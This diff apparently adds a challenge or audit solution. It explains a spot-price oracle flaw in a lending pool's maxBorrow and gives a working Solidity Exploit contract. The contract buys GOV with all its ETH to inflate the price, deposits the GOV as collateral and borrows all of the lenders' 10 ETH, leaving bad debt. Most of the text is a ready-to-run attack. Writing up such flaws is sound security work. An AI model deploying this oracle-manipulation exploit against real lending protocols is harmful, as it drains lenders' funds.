@@ -1,0 +1,36 @@
+The bug is that `maxBorrow` prices collateral from the pool's own spot reserves, so one large buy can inflate the GOV price.
+
+1. Buy GOV with all 10 ETH. This moves the price from 0.001 to about 0.004 ETH per GOV and gives about 4992 GOV.
+2. Deposit all of that GOV as collateral. Its borrow limit at the inflated price is about 14.9 ETH.
+3. Borrow 10 ETH, which is all of the lenders' liquidity.
+
+That leaves debt of 10 ETH against about 4992 GOV, which is worth only about 4.99 ETH at the fair price. The invariant is broken, and the collateral stays locked so the position is never unwound.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.28;
+
+interface ILendPool {
+    function buyGov() external payable;
+    function govOf(address) external view returns (uint);
+    function depositCollateral(uint amount) external;
+    function borrow(uint amount) external;
+}
+
+contract Exploit {
+    ILendPool pool;
+
+    constructor(address target) payable {
+        pool = ILendPool(target);
+    }
+
+    function run() external {
+        pool.buyGov{value: address(this).balance}();
+        uint g = pool.govOf(address(this));
+        pool.depositCollateral(g);
+        pool.borrow(10 ether);
+    }
+
+    receive() external payable {}
+}
+```
